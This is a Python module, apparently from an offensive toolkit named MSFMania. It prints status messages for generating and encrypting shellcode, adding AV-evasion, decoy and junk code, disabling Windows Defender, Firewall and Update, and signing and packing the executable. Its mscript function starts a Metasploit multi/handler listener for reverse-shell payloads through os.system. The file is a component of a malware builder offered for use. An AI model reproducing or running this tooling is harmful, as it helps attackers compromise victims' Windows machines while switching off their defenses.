from string import ascii_letters
from random import randint, SystemRandom
from os import system


class MmColors:
    blue = '\033[94m'
    green = '\033[92m'
    ocra = '\033[93m'
    red = '\033[91m'
    endc = '\033[0m'
    bold = '\033[1m'
    underline = '\033[4m'
    darkcyan = '\033[36m'


def banner():
    # Univers ASCII banner
    print(MmColors.bold + """                                                                                            
                ███╗   ███╗███████╗███████╗███╗   ███╗ █████╗ ███╗   ██╗██╗ █████╗ 
                ████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗████╗  ██║██║██╔══██╗
                ██╔████╔██║███████╗█████╗  ██╔████╔██║███████║██╔██╗ ██║██║███████║
                ██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║██║██╔══██║
                ██║ ╚═╝ ██║███████║██║     ██║ ╚═╝ ██║██║  ██║██║ ╚████║██║██║  ██║
                ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝                                                                                                                                                                                                                   
            Version : 2.3   -   Author : Killian CASAROTTO   -  Updated : June 28, 2020           
    """ + MmColors.endc)


def not_installed(package):
    print(MmColors.red + MmColors.bold + "[x] >>> '" + package + "' is not installed." + MmColors.endc)


def error_payload_lhost():
    print(MmColors.red + MmColors.bold + "[x] >>> The payload needs the '-lh' or '--lhost' argument.\n" + MmColors.endc + MmColors.bold + "Exiting..." + MmColors.endc)
    exit()


def error_payload_lport():
    print(MmColors.red + MmColors.bold + "[x] >>> The payload needs the '-lp' or '--lport' argument.\n" + MmColors.endc + MmColors.bold + "Exiting..." + MmColors.endc)
    exit()


def error_payload_injectiontype():
    print(MmColors.red + MmColors.bold + "[x] >>> The payload needs the '-it' or '--injectiontype' argument.\n" + MmColors.endc + MmColors.bold + "Exiting..." + MmColors.endc)
    exit()


def warning_injectionType():
    print(MmColors.ocra + MmColors.bold + "[!] >>> 'Remote' injection only works with x64 architectures. " + MmColors.endc + MmColors.bold + "Changing the parameter to 'local'." + MmColors.endc)


def error_procname(processname):
    print(MmColors.red + MmColors.bold + "[x] >>> The specified process name is incorrect '" + MmColors.endc + MmColors.bold + processname + "'.\n" + "Exiting..." + MmColors.endc)
    exit()


def error_icon(icon):
    print(MmColors.red + MmColors.bold + "[x] >>> The specified icon name is incorrect '" + MmColors.endc + MmColors.bold + icon + "'.\n" + "Exiting..." + MmColors.endc)
    exit()


def error_icon_file(icon):
    print(MmColors.red + MmColors.bold + "[x] >>> The specified icon filename does not exist '" + MmColors.endc + MmColors.bold + icon + "'.\n" + "Exiting..." + MmColors.endc)
    exit()


def varname_creator():
    varname = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(24, 160)))
    return varname


def shellcode_generated():
    print(MmColors.green + MmColors.bold + "[+] >>> Shellcode generated." + MmColors.endc)


def shellcode_encrypted():
    print(MmColors.green + MmColors.bold + "[+] >>> Shellcode encrypted." + MmColors.endc)


def decoy_added():
    print(MmColors.green + MmColors.bold + "[+] >>> Decoy code added." + MmColors.endc)


def evasion_added():
    print(MmColors.green + MmColors.bold + "[+] >>> Evasion code added." + MmColors.endc)


def junkcode_added():
    print(MmColors.green + MmColors.bold + "[+] >>> Junkcode added." + MmColors.endc)


def junkfunc_added():
    print(MmColors.green + MmColors.bold + "[+] >>> Junkfunc added." + MmColors.endc)


def wd_added():
    print(MmColors.green + MmColors.bold + "[+] >>> Disabling Windows Defender added." + MmColors.endc)


def wl_added():
    print(MmColors.green + MmColors.bold + "[+] >>> Disabling Windows Firewall added." + MmColors.endc)


def wu_added():
    print(MmColors.green + MmColors.bold + "[+] >>> Disabling Windows Update added." + MmColors.endc)


def compilation_completed():
    print(MmColors.green + MmColors.bold + "[+] >>> File compiled and stripped." + MmColors.endc)


def bad_certificate():
    print(MmColors.red + MmColors.bold + "[x] >>> There is an error in the specified certificate. The executable file has not been signed." + MmColors.endc)


def exe_signed():
    print(MmColors.green + MmColors.bold + "[+] >>> Exe file signed." + MmColors.endc)


def file_size(fs):
    print(MmColors.bold + f"[o] >>> Exe file size : {fs} bytes." + MmColors.endc)


def rar_compressed():
    print(MmColors.green + MmColors.bold + "[+] >>> Exe file compressed to RAR file." + MmColors.endc)


def mscript(architecture, types, payload, lhost, lport):
    lhost = lhost.replace("lhost=", "")
    lport = lport.replace("lport=", "")
    if architecture == "x64":
        if types == "yes":
            system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; set AutoLoadStdapi false; set AutoSystemInfo false; set AutoVerifySession false; exploit -j -z"')

        elif types == "no":
            system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; exploit -j -z"')

    elif architecture == "x86":
        if types == "yes":
            system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; set AutoLoadStdapi false; set AutoSystemInfo false; set AutoVerifySession false; exploit -j -z"')

        elif types == "no":
            system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; exploit -j -z"')
